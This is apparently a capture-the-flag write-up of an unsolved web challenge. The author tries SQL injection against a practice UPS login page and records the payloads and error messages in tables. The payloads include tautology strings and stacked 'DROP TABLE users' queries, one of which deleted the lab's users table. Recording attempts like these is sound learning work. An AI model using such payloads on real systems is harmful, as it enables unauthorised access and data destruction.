# Task 35- Uninterrupted Problem Supply (Unsolved)
Category: Web

Points: 30*

*No points where earned 

[Challange](#Challange)

[Solve](#Solve)

[Flag](#Flag)

# Challange
"Virelia simply loves buying devices from Mechacore. Their most recent acquisition is a UPS unit. Mechacore promised the login page was 100% secure. Let's see if it can keep us out."

Website URL: http://<target_ip>

# Solve
Going to the target ip url showed a login page. Testing the waters I tried:
- username: admin 
- password: admin 

This threw the message "invalid username or password". This meant that there was no way to test if the individual username or password is wrong. 

![Screenshot 2025-06-27 201245](https://github.com/user-attachments/assets/204c6281-a0bb-4a3d-bc48-f69fb8cc9dc4)

Asking ChatGPT for help, I got my next steps.

Step 1 was to try common username and password combinations. I kept getting the same invalid message, so I moved on.
- Admin, admin
- Admin, password
- Root, root
 
Step 2 involved trying SQL injections. Trying {‘1’=’1’} (without the { }) yielded a new error message. 

"Database error: 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1'='1''' at line 1"

I now knew for a fact that there was an SQL server on the backend that did not have input validation. I asked ChatGPT and did some Googling for injections that I could try.

*I only tried the usernames and left password blank (only a space)

| Username | Error |
| --- | --- |
| '1'='1 | database error |
| ' OR '1'='1' -- | Database error, same as above |
| ' OR '1'='1' # | invalid username or password |
| admin' -- | Database error |
| ' | database error |
| '-- | database error |
| test' | database error |
| a' OR 1=1-- | database error |
| admin' # | invalid error |
| " or ""=" | invalid error |

For the next round of attempts I tried injecting into the username and password fields at the same time.

*inputted both into username and password

| Username & Password | Error |
| --- | --- |
| ' OR 1=1 -- | database error |
| ' or '1'='1 | invalid error |
| " or ""=" | invalid error |

Not getting new information, I decided to try a different approch.

| Username | Password | Error |
| --- | --- | --- |
| admin') --  | hello | invalid error |
| ' OR 1=1';drop table user-- | *a single space | database error |
| ' OR ‘1’=’1;drop table user-- | *a single space | invalid |

What do I know?
- Works: ending with ‘--’, word the single quote (test’), '1'='1
- Doesn’t: double quotes, ending with #, ending with ') --, leaving the username blank and injecting into the password

6/29/25- the next day

Opening Burpsuite, I caught login package and sent it to the to repeater. This allowed me more freedom to input different things that where blocked before.
- username=&password= (both inputs left blank), Result: database error
- username=’; DROP TABLE users; --&password=, Result: invalid error

Something odd happened after I ran the DROP TABLE users command.
- Username=’’&password=, Result: class="error">Database error: 1146 (42S02): Table &#39;industrial_system.users&#39; doesn&#39;t exist

![Screenshot 2025-06-29 154528](https://github.com/user-attachments/assets/34a63284-5f1b-4bf6-a604-d8731186d0b2)

After resetting the target machine, I reran the same inputs for the username and password. This time there was an invalid error.

ChatGPT helped me figure out there are 3 columns (started with ‘ ORDER BY 1 -- and added 1 intel it stopped giving me invalid error).

![Screenshot 2025-06-29 155717](https://github.com/user-attachments/assets/e58d9832-dd0f-4e22-9330-88c5ea9c2344)

What do I know?
- The table is named 'users' and there are 3 columns (names not known)
- Works: injecting into the username, single quotes, not putting anything into the password field
- Doesn’t: double quotes, ending with #, ending with ') --, leaving the username blank and injecting into the password

At this point I quit this challange and moved on. My teammates and myself were not able to find the flag.

# Flag
MISSING












